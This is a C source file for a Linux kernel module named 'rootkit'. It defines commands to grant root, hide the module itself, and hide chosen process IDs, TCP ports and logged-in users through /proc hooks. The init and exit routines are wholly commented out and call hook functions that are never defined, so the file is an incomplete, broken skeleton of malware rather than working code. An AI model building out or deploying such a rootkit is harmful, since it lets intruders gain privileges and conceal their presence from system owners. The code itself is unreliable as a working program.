#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/namei.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/version.h>
#include <linux/delay.h>

#define MODULE_NAME      "rootkit"
#define MAX_COMMAND_SZ   30
#define MAX_HIDDEN_PIDS  80
#define MAX_PID_LENGTH   6
#define MAX_HIDDEN_PORTS 20
#define MAX_PORT_LENGTH  5
#define MAX_HIDDEN_USERS 10
/* Commands */

#define MAKE_ROOT_CMD   "root"
#define HIDE_MOD_CMD    "hide"
#define SHOW_MOD_CMD    "show"
#define HIDE_PID_CMD    "hpid"
#define SHOW_PID_CMD    "spid"
#define HIDE_DPORT_CMD  "hdport"
#define HIDE_SPORT_CMD  "hsport"
#define SHOW_DPORT_CMD  "sdport"
#define SHOW_SPORT_CMD  "ssport"
#define HIDE_USER_CMD   "huser"
#define SHOW_USER_CMD   "suser"




#define USER_PROCESS    7
#define UT_LINESIZE     32
#define UT_NAMESIZE     32
#define UT_HOSTSIZE     256

struct exit_status {
  short int e_termination;    /* process termination status */
  short int e_exit;           /* process exit status */
};

struct utmp {
  short ut_type;              /* type of login */
  pid_t ut_pid;               /* PID of login process */
  char ut_line[UT_LINESIZE];  /* device name of tty - "/dev/" */
  char ut_id[4];              /* init id or abbrev. ttyname */
  char ut_user[UT_NAMESIZE];  /* user name */
  char ut_host[UT_HOSTSIZE];  /* hostname for remote login */
  struct exit_status ut_exit; /* The exit status of a process
                                 marked as DEAD_PROCESS */
  int32_t ut_session;         /* Session ID, used for windowing */
  struct {
    int32_t tv_sec;           /* Seconds */
    int32_t tv_usec;          /* Microseconds */
  } ut_tv;                    /* Time entry was made */

 int32_t ut_addr_v6[4];       /* IP address of remote host */
  char __unused[20];           /* Reserved for future use */
};

/* Injection structs */
struct inode *pinode, *tinode, *uinode, *rcinode, *modinode;
struct proc_dir_entry *modules, *root, *handler, *tcp;
static struct file_operations modules_fops, proc_fops, handler_fops, tcp_fops, user_fops, rc_fops, mod_fops;
const struct file_operations *proc_original = 0, *modules_proc_original = 0, *handler_original = 0, *tcp_proc_original = 0, *user_proc_original = 0, *rc_proc_original = 0, *mod_proc_original;
filldir_t proc_filldir, rc_filldir, mod_filldir;

char *rc_name, *rc_dir, *mod_name, *mod_dir;
module_param(rc_name , charp, 0);
module_param(rc_dir  , charp, 0);
module_param(mod_name, charp, 0);
module_param(mod_dir, charp, 0);


typedef void (*pid_function_t)(unsigned);
typedef void (*hide_port_function_t)(unsigned short);
typedef void (*user_function_t)(char *);


char hidden_pids[MAX_HIDDEN_PIDS][MAX_PID_LENGTH];
char hidden_dports[MAX_HIDDEN_PORTS][MAX_PORT_LENGTH], hidden_sports[MAX_HIDDEN_PORTS][MAX_PORT_LENGTH];
char hidden_users[MAX_HIDDEN_USERS][UT_NAMESIZE];
unsigned hidden_pid_count = 0, hidden_dport_count = 0, hidden_sport_count = 0, hidden_user_count = 0;


static int __init module_init_proc(void) {
	// static struct file_operations fileops_struct = {0};
	// struct proc_dir_entry *new_proc;
	// // dummy to get proc_dir_entry of /proc
	// if (rc_name && rc_dir)
	// 	init_hide_rc();
	// if (mod_name && mod_dir)
	// 	init_hide_mod();
	// new_proc = proc_create("dummy", 0644, 0, &fileops_struct);
	// root = new_proc->parent;

	// init_tcp_hide_hook(root);
	// init_module_hide_hook(root);
	// init_users_hide_hook(root);

	// hook_proc(root);

	// // install the handler to wait for orders...
	// install_handler(root);

	// // i't no longer required.
	// remove_proc_entry("dummy", 0);
	// return 0;
}

 
static void module_exit_proc(void) {
    // if(proc_original)
    //     pinode->i_fop = proc_original;
    // if(tcp_proc_original)
    //     tinode->i_fop = tcp_proc_original;
    // if(user_proc_original)
    //     uinode->i_fop = user_proc_original;
    // if(rc_proc_original)
    //     rcinode->i_fop = rc_proc_original;
    // if(mod_proc_original)
    //     modinode->i_fop = mod_proc_original;
    // show_module();
    // if(handler_original) {
    //     handler->proc_fops = handler_original;
    //     handler->mode &= (~S_IWUGO);
    // }
}
                 
module_init(module_init_proc);
module_exit(module_exit_proc);
 
MODULE_LICENSE("GPL");